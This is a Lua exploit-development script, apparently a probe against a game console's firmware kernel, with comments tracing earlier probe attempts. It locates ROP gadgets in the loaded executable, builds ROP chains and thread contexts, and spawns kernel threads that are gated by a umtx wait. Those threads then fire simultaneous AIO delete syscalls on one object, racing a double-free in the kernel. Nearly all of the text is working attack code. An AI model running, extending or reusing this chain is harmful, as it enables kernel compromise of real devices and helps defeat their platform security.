-- CRASH_CLASS: HIGH
-- PROBE 719a: release two delete children together with one umtx wake.
--
-- Context: 718a tried to align two children with nanosleep and neither ever
-- wrote a status, so syscall 240 is not a usable sleep here. 713a's plain
-- back-to-back spawn never overlapped, because spawn latency exceeds the whole
-- handler.
--
-- _umtx_op (454) is proven on this firmware: op 2 waits while the word still
-- matches, op 3 wakes it (56i2, 152k). Two children therefore block in the
-- kernel on the same word, and one wake call releases both in the same lock
-- batch - a much tighter rendezvous than a timer, and no spinning thread is left
-- behind because each child ends with thr_exit(431).
--
--     fn(454 WAIT on W) -> pop rdi,<id page> -> fn(662 delete) -> fn(431 exit)

print("=== PROBE 719a: umtx-gated delete pair ===")
print("")
local function to_num(v)
    if type(v)=="table" and v.tonumber then return v:tonumber() end
    if type(v)=="table" and v.h then return v.h*4294967296+v.l end
    return tonumber(v) or 0
end
local function mk(n)
    local t={}
    for k,v in pairs(syscall.pipe) do t[k]=v end
    t.syscall_no=n
    setmetatable(t,getmetatable(syscall.pipe))
    return t
end
local function rd(a) local o,v=pcall(function() return memory.read_dword(a) end); if o then return to_num(v) end end
local function wd(a,v) pcall(function() memory.write_dword(a,v) end) end
local function wq(a,v) pcall(function() memory.write_qword(a,v) end) end
local function zero(a,n) pcall(function() for i=0,n-4,4 do memory.write_dword(a+i,0) end end) end

local fn_ud = syscall.pipe.fn_addr
local fn = to_num(fn_ud)
print("[A] trampoline=0x" .. string.format("%X", fn) .. " pid=" .. tostring(to_num(native.fcall_with_rax(fn_ud, 20))))

local info = memory.alloc(0x200)
wd(info, 0x160)
pcall(function() mk(593)(uint64(0), uint64(info)) end)
local ebase = (rd(info+0x10C) or 0)*4294967296 + (rd(info+0x108) or 0)
local function find_pat(base, limit, pat)
    local chunk, off = 0x1000, 0
    while off < limit do
        local n = math.min(chunk, limit-off)
        local ok, s = pcall(function() return memory.read_buffer(base+off, n) end)
        if not ok or type(s) ~= "string" then break end
        local pos = string.find(s, pat, 1, true)
        if pos then return base+off+pos-1 end
        off = off + n - (#pat-1)
        if n < chunk then break end
    end
    return nil
end
local pop_rax = find_pat(ebase, 0x494000, string.char(0x58,0xC3))
local pop_rdi = find_pat(ebase, 0x494000, string.char(0x5F,0xC3))
local pop_rsi = find_pat(ebase, 0x494000, string.char(0x5E,0xC3))
local pop_rdx = find_pat(ebase, 0x494000, string.char(0x5A,0xC3))
local jmp_g   = find_pat(ebase, 0x494000, string.char(0xEB,0xFE))
print(string.format("[A] eboot=0x%X pop_rax=0x%X pop_rdi=0x%X jmp$=0x%X", ebase, pop_rax or 0, pop_rdi or 0, jmp_g or 0))
if not pop_rax or not pop_rdi or not pop_rsi or not pop_rdx or not jmp_g then print("[A] gadgets missing") return end

local sc_mmap = mk(477)
local page = 0x4000
local function mmap(px)
    local _, a = pcall(function() return sc_mmap(uint64(0), uint64(px), uint64(3), uint64(0x1002), uint64(0xFFFFFFFF), uint64(0)) end)
    local v = to_num(a)
    if v ~= 0 then zero(v, px) end
    return v
end

local Ctx = {MAGIC=0x108, TYPE=0x110, CS=0x0C0, RIP=0x0E0, RSP=0x0F8, SS=0x100,
             RDI=0x048, RSI=0x050, RDX=0x058, RCX=0x060, R8=0x068, RAX=0x078}

local W = mmap(page)      -- shared umtx word

local function spawn_child(idpage, stat)
    local stack = mmap(page*4)
    local base = stack + page*4 - 0x200
    -- after the wait RDI/RSI/RDX still hold the umtx arguments, so all three
    -- aio arguments must be reloaded (probe 719a v1 only reloaded RDI and the
    -- delete ran with count=2 and a NULL status pointer)
    wq(base,     uint64(pop_rdi))
    wq(base+8,   uint64(idpage))
    wq(base+16,  uint64(pop_rsi))
    wq(base+24,  uint64(1))
    wq(base+32,  uint64(pop_rdx))
    wq(base+40,  uint64(stat))
    wq(base+48,  uint64(pop_rax))
    wq(base+56,  uint64(662))
    wq(base+64,  uint64(fn))
    wq(base+72,  uint64(pop_rax))
    wq(base+80,  uint64(431))
    wq(base+88,  uint64(fn))
    wq(base+96,  uint64(jmp_g))
    local ctx = memory.alloc(0x500)
    zero(ctx, 0x500)
    wq(ctx+Ctx.MAGIC, uint64(0x480))
    wq(ctx+Ctx.TYPE, uint64(0x10000))
    wq(ctx+Ctx.CS, uint64(0x43))
    wq(ctx+Ctx.SS, uint64(0x3B))
    wq(ctx+Ctx.RIP, uint64(fn))
    wq(ctx+Ctx.RSP, uint64(base))
    wq(ctx+Ctx.RDI, uint64(W))
    wq(ctx+Ctx.RSI, uint64(2))     -- UMTX_OP_WAIT
    wq(ctx+Ctx.RDX, uint64(0))     -- expected word
    wq(ctx+Ctx.RAX, uint64(454))
    local tb = memory.alloc(8)
    wq(tb, uint64(0))
    local ok, rv = pcall(function() return mk(430)(uint64(ctx), uint64(tb), uint64(0)) end)
    return ok and to_num(rv) == 0
end

local both, one, none = 0, 0, 0
for round=1,30 do
    local data = mmap(page)
    local o = mmap(page)
    local okc, rvc = pcall(function() return mk(669)(uint64(0x1), uint64(data), uint64(1), uint64(1), uint64(o)) end)
    if not (okc and to_num(rvc) == 0) then print("[B] create failed") break end
    -- a fresh object is not deletable until it has been polled (state 3/4 gate
    -- at 8ad6ff61 returns 0x80020010 otherwise)
    local pout = mmap(page)
    pcall(function() mk(664)(uint64(o), uint64(1), uint64(pout)) end)
    local idpage = mmap(page)
    wd(idpage, rd(o) or 0)
    wd(W, 0)
    local sa = mmap(page)
    local sb = mmap(page)
    wd(sa, 0x77777777)
    wd(sb, 0x77777777)
    local ka = spawn_child(idpage, sa)
    local kb = spawn_child(idpage, sb)
    if not (ka and kb) then print(string.format("    round %d spawn failed %s/%s", round, tostring(ka), tostring(kb))) end
    -- give both children time to block, then wake them together
    local ts = memory.alloc(16)
    wq(ts, 0); wq(ts+8, 20000000)
    pcall(function() mk(240)(uint64(ts), uint64(0)) end)
    for i=1,10 do
        pcall(function() mk(454)(uint64(W), uint64(3), uint64(2), uint64(0), uint64(0)) end)
    end
    wq(ts+8, 30000000)
    pcall(function() mk(240)(uint64(ts), uint64(0)) end)
    local a, b = rd(sa) or 0, rd(sb) or 0
    if a == 0 and b == 0 then both = both + 1
    elseif a == 0 or b == 0 then one = one + 1
    elseif a == 0x77777777 and b == 0x77777777 then none = none + 1 end
    if round % 6 == 0 then
        print(string.format("[B] round %d both=%d one=%d none=%d last=%08X/%08X", round, both, one, none, a, b))
    end
end
print(string.format("[C] both-zero=%d one-zero=%d none=%d", both, one, none))
print(string.format("[Z] alive=%d", to_num(native.fcall_with_rax(fn_ud, 20))))
